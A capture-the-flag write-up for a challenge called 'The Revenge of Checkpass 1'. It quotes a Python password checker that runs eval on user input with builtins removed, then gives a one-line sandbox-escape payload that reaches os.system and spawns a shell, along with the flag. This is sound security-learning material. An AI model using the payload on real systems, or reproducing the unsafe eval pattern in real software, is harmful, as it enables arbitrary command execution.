# Bonus: The Revenge of Checkpass 1
> Last year (in an unrelated contest), I made a Python password checker that had way too many solutions. To be fair, it was on me for using eval without sanitizing input or anything, but like, cmon, can we not just trust people nowadays? What happened to the days of leaving your front door unlocked?

> Anyways, I made it completely foolproof this time: no flag variable, no more printing, heck, no builtins at all!

> Surely it's unbreakable now…right?

> This problem was inspired by an online judge platform that shall not be named.

## About the Challenge
We have been givena a `zip` file that contain a python script. Here is the content of the script

```python
#!/usr/local/bin/python
# -*- coding: utf-8 -*-

def main():
  password = "the password can contain non-ascii charactérs :)"
  inp = input("Enter a Python list: ")
  lis = eval(inp, {'__builtins__': None}, None)
  if type(lis) != list:
    print("That's not a list")
    return
  for i in lis:
    if not isinstance(i, int):
      print("The list can only contain integers")
      return
  if lis == [ord(e) for e in password]:
    print("You are now authorized!")
    with open("flag.txt", "r") as flag:
      print(flag.read())
  else:
    print("Incorrect password!")

if __name__ == "__main__":
  main()
```

This code snippet prompts the user to enter a Python list as input, evaluates the input string as a Python expression, and assigns the resulting list to the variable lis, while restricting access to built-in functions and variables for security purposes.

## How to Solve?
Im using PyJail payload to breakout from the sandbox. Here is the payload that I used

```
().__class__.__base__.__subclasses__()[141].__init__.__globals__["system"]("sh")
```

![flag](images/flag.png)

```
ctf{pyth0n_s4ndb0x_br34k0ut_1f8bca}
```